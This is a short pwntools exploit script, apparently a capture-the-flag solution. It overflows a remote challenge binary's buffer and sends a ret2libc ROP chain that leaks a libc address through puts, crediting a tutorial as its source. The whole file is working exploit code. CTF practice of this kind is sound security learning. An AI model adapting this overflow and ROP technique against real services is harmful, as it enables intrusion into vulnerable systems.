""" The following script was based heavily on the script provided in the following url """
"""           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              """

from pwn import * # Import pwntools

p = remote("chals20.cybercastors.com", 14425)
#p = process("./bof") # start the vuln binary
elf = ELF("./bof") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

# Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget
PUTS = elf.plt['puts']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"
MAIN = elf.symbols['main']
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

base = b"A"*256 + b"B"*8 #Overflow buffer until return address
# Create rop chain
rop = base +  p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS)

#print(rop)
#Send our rop-chain payload
p.sendline(rop)
#p.sendline( rop)
#p.sendline()

#p.interactive()
#Parse leaked address
print(p.recvline())
print(p.recvline())
received = p.recvline()
received = received.strip()
leak = u64(received.ljust(8, b"\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

p.close()
